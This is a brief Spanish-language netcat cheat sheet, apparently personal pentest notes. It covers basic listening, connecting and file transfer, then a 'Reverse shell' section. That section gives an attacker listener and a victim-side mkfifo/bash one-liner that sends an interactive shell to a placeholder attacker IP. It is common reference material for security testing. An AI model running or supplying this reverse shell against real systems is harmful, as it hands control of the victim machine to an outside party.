# Netcat

## Comunicación entre dos máquinas

```bash
nc -l -p 1234            # Escuchar en el puerto 1234
nc ip 1234               # Conectar a la ip en el puerto 1234
nc -l -p 1234 > file.txt # Escuchar en el puerto 1234 y guardar la salida en file.txt
nc ip 1234 < file.txt    # Conectar a la ip en el puerto 1234 y enviar el contenido de file.txt
```

## Reverse shell

### Atacante

```bash
nc -lvp <puerto>
```

### Victima

```bash
mkfifo /tmp/fifo; cat /tmp/fifo | /bin/bash -i 2>&1 | nc <IP_atacante> <puerto> > /tmp/fifo
```